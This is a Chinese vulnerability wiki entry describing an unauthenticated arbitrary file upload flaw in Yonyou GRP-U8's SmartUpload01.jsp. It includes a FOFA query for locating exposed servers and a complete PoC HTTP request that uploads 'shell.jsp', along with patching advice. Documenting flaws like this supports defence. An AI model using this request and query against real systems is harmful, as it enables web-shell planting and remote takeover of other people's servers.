---
fofa: "app=\"用友-GRP-U8\""
source: "互联网公开漏洞整理 202309-202406（VulWiki 仓库内汇总条目 §42）"
---

# 用友 GRP-U8 SmartUpload01.jsp 任意文件上传漏洞

# 漏洞描述

用友 GRP-U8 /u8qx/SmartUpload01.jsp 存在任意文件上传漏洞。攻击者无需认证即可上传恶意 JSP 文件到服务器，进而远程控制服务器。

# 影响版本

用友 GRP-U8

# **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 是 | 已公开 | 未公开 | 未知 |

# 漏洞复现

FOFA：app="用友-GRP-U8"

POC/EXP：

```
POST /u8qx/SmartUpload01.jsp HTTP/1.1
Host: {{Hostname}}
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="shell.jsp"
Content-Type: application/octet-stream

<% out.println("test"); %>
------WebKitFormBoundary--
```

上传成功后访问对应路径的 JSP 文件即可执行任意代码。

# 漏洞修复

联系用友官方获取安全补丁，对上传接口增加身份认证与文件类型白名单校验。
